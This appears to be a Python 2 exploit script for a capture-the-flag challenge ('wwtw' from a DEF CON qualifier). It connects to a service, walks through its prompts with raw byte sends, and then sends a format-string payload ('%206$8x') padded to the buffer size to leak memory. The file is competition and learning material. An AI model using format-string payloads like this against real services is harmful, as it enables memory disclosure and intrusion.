import socket
import time
from struct import pack
import re

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.connect(("wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me", 2606))
s.connect(('127.0.0.1',4444))
raw_input('debug')
for i in range(1000):
	str =  s.recv(1024)
	if('KEY' in str):
		break;
	else:
		print str
	s.send(raw_input('@') + '\n')
s.send('UeSlhCAGEp'+'\n')
#raw_input('debug1')
print s.recv(1024)
i = 0

s.send(pack('Q',ord('1')) + '\x00')
str = s.recv(1024)
print str,i
#	raw_input('debug2')
time.sleep(4)
#s.send('\x31')
#print s.recv(1024)
s.send('\x70\x2b\x59\x55')
s.send('\x31')

str = s.recv(1024)
if ('Dematerialize' in str):
	print str
	print 'ok'
s.send(pack('Q',ord('1')) + '\x00')
print s.recv(1024)
s.send(pack('Q',ord('3')) + '\x00')
print s.recv(1024)
str = '51.492137,-0.192878,aaaa%206$8x'
#str = '51.492137'+'%p '*200+',-0.192878'
#raw_input("here")
s.send(str + (1023-len(str))*'a'+'\x0a')
result =  s.recv(10240)
print result
